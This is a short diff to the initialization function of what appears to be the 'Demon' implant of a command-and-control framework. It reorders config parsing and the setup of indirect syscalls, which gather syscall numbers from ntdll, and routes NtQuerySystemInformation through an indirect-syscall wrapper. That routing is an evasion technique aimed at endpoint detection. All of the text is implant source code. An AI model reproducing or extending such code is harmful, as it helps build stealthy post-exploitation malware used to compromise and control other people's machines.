@@ -760,12 +760,25 @@ VOID DemonInit( VOID )
         Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );
     }
 
-    PUTS( "Set basic info" )
+    /* Parse config */
+    DemonConfig();
 
-    if ( ! NT_SUCCESS( Instance.Win32.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) ) {
+    /* now do post init stuff after parsing the config */
+    if ( Instance.Config.Implant.SysIndirect )
+    {
+        /* Initialize indirect syscalls + get SSN from every single syscall we need */
+        if  ( ! SysInitialize( Instance.Modules.Ntdll ) ) {
+            PUTS( "Failed to Initialize syscalls" )
+            /* NOTE: the agent is going to keep going for now. */
+        }
+    }
+
+    /* query current processor architecture */
+    if ( ! NT_SUCCESS( SysNtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) ) {
         PUTS( "[!] NtQuerySystemInformation Failed" );
     }
 
+    /* if ModuleBase has not been specified then lets use the current process one */
     if ( ! Instance.Session.ModuleBase ) {
         /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
         Instance.Session.ModuleBase = LdrModulePeb( 0 );
@@ -815,18 +828,7 @@ VOID DemonInit( VOID )
 
     PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
 
-    /* Parse config */
-    DemonConfig();
 
-    /* now do post init stuff after parsing the config */
-    if ( Instance.Config.Implant.SysIndirect )
-    {
-        /* Initialize indirect syscalls + get SSN from every single syscall we need */
-        if  ( ! SysInitialize( Instance.Modules.Ntdll ) ) {
-            PUTS( "Failed to Initialize syscalls" )
-            /* NOTE: the agent is going to keep going for now. */
-        }
-    }
 }
 
 VOID DemonConfig()
